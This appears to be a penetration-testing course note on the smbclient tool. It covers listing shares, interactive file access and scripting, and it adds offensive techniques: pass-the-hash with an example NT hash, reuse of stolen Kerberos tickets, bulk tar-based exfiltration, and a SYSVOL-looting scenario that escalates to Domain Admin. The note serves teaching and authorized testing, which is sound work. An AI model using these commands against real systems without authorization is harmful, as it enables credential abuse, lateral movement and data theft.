---
tags: [tools, enumeration, exploitation, vapt]
difficulty: intermediate
module: "59 - Complete Tools Reference"
topic: "59.69 smbclient Full Usage Guide"
---

# smbclient Full Usage Guide

## 1. Introduction to smbclient

`smbclient` is an essential command-line utility for interacting with Server Message Block (SMB) and Common Internet File System (CIFS) servers. Originating from the Samba suite on Linux, it provides an FTP-like interface to access Windows file shares, download/upload files, and manage directory structures remotely.

While tools like `enum4linux` automate the discovery of shares, `smbclient` is the surgical tool you use once a specific share of interest has been identified. Whether you are connecting anonymously to a misconfigured public share, or using compromised Domain Admin credentials to access the `C$` drive of a Domain Controller, `smbclient` provides the interactive shell necessary for deep exploration.

## 2. Architecture and Attack Flow Diagram

```text
+---------------------------------------------------------+
|                  Attacker Workstation                   |
|                                                         |
|  +---------------------------------------------------+  |
|  | smbclient Interface                               |  |
|  |                                                   |  |
|  |  +-------------+  +-------------+  +-----------+  |  |
|  |  | Interactive |  | Command (-c)|  | Tar (-T)  |  |  |
|  |  | Shell Prompt|  | Execution   |  | Archiving |  |  |
|  |  +------+------+  +------+------+  +-----+-----+  |  |
|  +---------|----------------|---------------|--------+  |
+------------|----------------|---------------|-----------+
             |                |               |
             |           SMB (TCP/445)        |
             |        Authentication Phase    |
             |       (NTLMv1/v2, Kerberos)    |
             v                v               v
+---------------------------------------------------------+
|                  Target Windows Server                  |
|                                                         |
|  +---------------------------------------------------+  |
|  | Windows SMB Server Service (srv2.sys)             |  |
|  |                                                   |  |
|  |  +---------------------------------------------+  |  |
|  |  | Access Control List (ACL) Evaluation        |  |  |
|  |  +---------------------------------------------+  |  |
|  |           |                        |              |  |
|  |  +--------v-------+       +--------v-------+      |  |
|  |  | Standard Share |       | Admin Share    |      |  |
|  |  | (e.g., Public) |       | (e.g., C$,     |      |  |
|  |  |                |       |  ADMIN$)       |      |  |
|  |  +----------------+       +----------------+      |  |
|  +---------------------------------------------------+  |
+---------------------------------------------------------+
```

## 3. Core Commands and Connectivity

### 3.1 Listing Shares (`-L`)
Before connecting to a specific directory, you often need to see what is available. The `-L` flag asks the server to list all shares it hosts.
- **Anonymous/Null Session**: `smbclient -L //192.168.1.100 -N` (The `-N` flag means "No Password").
- **Authenticated**: `smbclient -L //192.168.1.100 -U "administrator"` (You will be prompted for a password).

### 3.2 Connecting to a Share
To establish an interactive session, you specify the target IP and the exact share name. Note that forward slashes `//` are used in Linux, unlike the backslashes `\\` used in Windows UNC paths.
- **Syntax**: `smbclient //192.168.1.100/Public -U "jane.doe"`
- **Domain Authentication**: If you need to specify a domain, use the `-W` flag or append it to the username:
  `smbclient //192.168.1.100/IT_Scripts -U "CORP\jane.doe"`

### 3.3 The Interactive Prompt (`smb: \>`)
Once connected, you are presented with an FTP-like shell. Key commands include:
- `ls` or `dir`: List the contents of the current directory.
- `cd <dir>`: Change into a directory.
- `get <file>`: Download a specific file to your local machine.
- `put <file>`: Upload a file from your local machine to the share.
- `mget *`: Download multiple files (wildcards supported).
- `mput *`: Upload multiple files.
- `prompt OFF`: A critical command when using `mget`. By default, `smbclient` will prompt you `(y/n)` for every single file when using wildcards. Turning the prompt off ensures bulk downloads happen silently.
- `recurse ON`: Another critical command. When combined with `mget *` and `prompt OFF`, it allows you to recursively download an entire directory tree with a single command.

## 4. Advanced Authentication Techniques

In modern Active Directory environments, simply typing a password isn't always the method of choice. Penetration testers often rely on credential material extracted from memory.

### 4.1 Pass-the-Hash (PtH)
If you dump the Local Security Authority Subsystem Service (LSASS) memory and extract an NTLM hash, you do not need to crack it to authenticate. `smbclient` supports Pass-the-Hash natively.
- **Syntax**: You use the `--pw-nt-hash` flag and provide the NT hash (the second half of the LM:NT hash string).
- **Example**: `smbclient //10.10.10.5/C$ -U "Administrator" --pw-nt-hash 32ed87afd5ff1a71c532f5e6b010c714`
- **Impact**: This instantly grants you access as the Administrator without ever knowing their plaintext password.

### 4.2 Kerberos Authentication (`-k`)
If you have compromised a Kerberos Ticket Granting Ticket (TGT) or a Service Ticket (TGS), you can use it to authenticate to the SMB share without NTLM hashes.
1. Export the ticket to your environment: `export KRB5CCNAME=/path/to/ticket.ccache`
2. Connect using the Kerberos flag: `smbclient //WIN-DC01.corp.local/SYSVOL -k`
*(Note: You must use the FQDN of the server, not the IP address, for Kerberos to function correctly).*

## 5. Scripting and Automation

While the interactive shell is great for manual exploration, you often need to script interactions, especially when writing custom exploits or automating data exfiltration.

### 5.1 One-Liner Command Execution (`-c`)
The `-c` flag allows you to pass a string of commands directly to `smbclient` and have it exit immediately upon completion.
- **Syntax**: `smbclient //192.168.1.100/Public -U "user%password" -c "ls; cd Secret; get passwords.txt"`
- This is incredibly useful in bash scripts looping through a list of IPs.

### 5.2 Tar Archiving (`-T`)
When exfiltrating massive amounts of data (e.g., thousands of small log files), `mget` can be painfully slow because it opens and closes a connection for every single file. The `-T` (tar) flag forces the remote server to package the directory contents into a tarball and stream it to the attacker over a single continuous connection.
- **Syntax (Download)**: `smbclient //192.168.1.100/HugeShare -U "user%pass" -T c local_backup.tar *`
  *(This creates a local file `local_backup.tar` containing everything in `HugeShare`).*

## 6. Dealing with Legacy Systems (SMBv1)

Modern Linux distributions have disabled the horribly insecure SMBv1 protocol (NT1) in their default configurations. If you encounter an old Windows XP or Server 2003 machine, `smbclient` might fail to connect, throwing protocol negotiation errors.

- **Bypassing the restriction**: You must force `smbclient` to use the legacy protocol by defining the minimum and maximum client protocols in the command line or modifying `/etc/samba/smb.conf`.
- **Command Line Override**:
  `smbclient -L //10.10.10.5 -U "" -N --option='client min protocol=NT1' --option='client max protocol=NT1'`

## 7. Troubleshooting Common Errors

### 7.1 `NT_STATUS_ACCESS_DENIED`
You have authenticated successfully, but your user account does not have read permissions for the specific share or file you are trying to access.

### 7.2 `NT_STATUS_LOGON_FAILURE`
Authentication failed. This could be a bad password, a locked-out account, or a time synchronization issue if using Kerberos.

### 7.3 `NT_STATUS_CONNECTION_REFUSED`
The host is up, but TCP port 445 is closed or firewalled. SMB services are not listening.

## 8. Real-World Scenario: Looting SYSVOL

1.  **Initial Enumeration**: You compromise a low-privileged AD user account. You know that all Domain Controllers host a share called `SYSVOL`, which contains domain policies and logon scripts.
2.  **Connection**: You connect to the DC:
    `smbclient //10.10.10.5/SYSVOL -U "low_user%Password123!"`
3.  **Exploration**: You navigate to `smb: \> cd domain\Policies\`
4.  **Bulk Download configuration**:
    ```text
    smb: \> prompt OFF
    smb: \> recurse ON
    smb: \> mget *
    ```
5.  **Offline Analysis**: The command recursively downloads hundreds of XML and VBS scripts. Offline, you run `grep -i "password" -r .` and discover a hardcoded `cpassword` in a Group Policy Preference (GPP) XML file. You decrypt this password to escalate to Domain Admin.

## 9. Chaining Opportunities
- **[[68 - enum4linux SMB Enumeration]]**: `enum4linux` is the precursor to `smbclient`. It maps the terrain and identifies the shares, while `smbclient` performs the actual data extraction.
- **[[50 - Mimikatz Advanced Usage]]**: Use Mimikatz on a compromised machine to dump NTLM hashes, which you then feed into `smbclient` using the `--pw-nt-hash` flag to move laterally.
- **[[28 - Impacket Tool Suite Overview]]**: While `smbclient` is excellent for file manipulation, if you need to gain command execution over SMB (e.g., via Windows Services or Scheduled Tasks), you must pivot to Impacket's `psexec.py` or `smbexec.py`.

## 10. Related Notes
- [[09 - NTLM and SMB Authentication Mechanics]]
- [[33 - Data Exfiltration Strategies]]
- [[40 - Active Directory Lateral Movement]]

























